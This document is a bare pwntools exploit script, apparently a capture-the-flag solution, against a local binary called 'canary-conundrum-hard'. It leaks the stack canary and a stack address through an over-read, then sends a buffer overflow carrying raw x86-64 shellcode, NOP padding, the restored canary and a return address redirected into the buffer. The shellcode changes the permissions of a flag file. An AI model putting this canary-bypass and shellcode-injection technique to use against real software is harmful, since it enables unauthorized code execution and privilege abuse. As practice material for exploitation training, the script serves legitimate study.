from pwn import *
import re

p = process("./canary-conundrum-hard")

print(p.clean())

p.sendline(b"200")

print(p.clean())

p.send(b"REPEAT" + b"A" * (137-6))

x = p.clean()
print(x)
leaked_data = [int.from_bytes(b, 'little') for m in re.findall(rb'(?s)(.{7})(.{5}\x7f)', x) for b in m]

leaked_canary = leaked_data[0]
leaked_canary = leaked_canary << 8

leaked_stack = leaked_data[1]

print("[+] Leaked Canary :: ", hex(leaked_canary))
print("[+] Leaked stack :: ", hex(leaked_stack))

print(p.clean())

p.sendline(b"200")
p.sendline(b"REPEAT")

print(p.clean())

p.sendline(b"200")

print(p.clean())

shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x53\x48\x89\xe7\x6a\x04\x5e\x6a\x5a\x58\x0f\x05"

print("[+] to return to :: ", hex(leaked_stack - 0x10d0 - 0x1bc))

payload = b""
payload += shellcode
payload += b"\x90" * (136 - len(shellcode))
payload += p64(leaked_canary)
payload += b"\x90" * 8
payload += p64(leaked_stack - 0x1290) # leaked_stack - leaked_stack_offset_to_current_rbp - from_rbp_to_our_input_buffer

p.send(payload)

print(p.clean())

p.close()
